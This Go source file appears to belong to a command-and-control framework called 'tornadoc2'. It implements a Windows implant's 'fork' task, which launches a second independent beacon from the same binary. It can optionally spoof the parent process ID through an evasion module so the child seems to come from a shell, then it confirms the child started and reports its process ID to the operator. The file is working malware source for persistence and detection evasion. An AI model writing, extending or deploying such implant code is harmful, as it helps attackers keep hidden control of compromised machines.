//go:build windows

package core

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"tornadoc2/agent/evasion"
	"tornadoc2/agent/protocol"
)

// forkVerb starts a second copy of this binary and keeps the parent
// alive. Unlike `migrate --self`, the original remains on its parent
// process, so a single fork produces two independent beacons.
func (a *Agent) forkVerb(ctx context.Context, t protocol.Task) Result {
	exe, err := os.Executable()
	if err != nil {
		return Result{ID: t.ID, Error: err.Error()}
	}
	if _, err := os.Stat(exe); err != nil {
		return Result{ID: t.ID, Error: "binary is memory-only"}
	}
	ready := filepath.Join(os.TempDir(),
		fmt.Sprintf(".t2-fork-%d-%d.ready", os.Getpid(),
			time.Now().UnixNano()))
	spoofParent := PpidSpoof
	for _, a := range t.Args {
		if a == "--parent" || a == "--ppid" {
			spoofParent = true
		}
	}
	var pid uint32
	if spoofParent {
		// Let the child see the ready path through its inherited
		// environment, then hand it a shell-derived parent.
		_ = os.Setenv(migrateReadyEnv, ready)
		pid, err = evasion.SpawnSpoofed()
		_ = os.Unsetenv(migrateReadyEnv)
	} else {
		var n int
		n, err = spawnDetached(exe, ready)
		pid = uint32(n)
	}
	if err != nil {
		return Result{ID: t.ID, Error: "fork: " + err.Error()}
	}
	ok := waitForReady(ready, 25*time.Second)
	_ = os.Remove(ready)
	if !ok {
		if p, ferr := os.FindProcess(int(pid)); ferr == nil {
			_ = p.Kill()
		}
		return Result{ID: t.ID,
			Error: fmt.Sprintf("fork: pid %d did not signal ready", pid)}
	}
	return Result{ID: t.ID, Output: encodeOutput([]byte(
		fmt.Sprintf("forked: pid=%d (parent %d alive)\n", pid,
			os.Getpid())))}
}
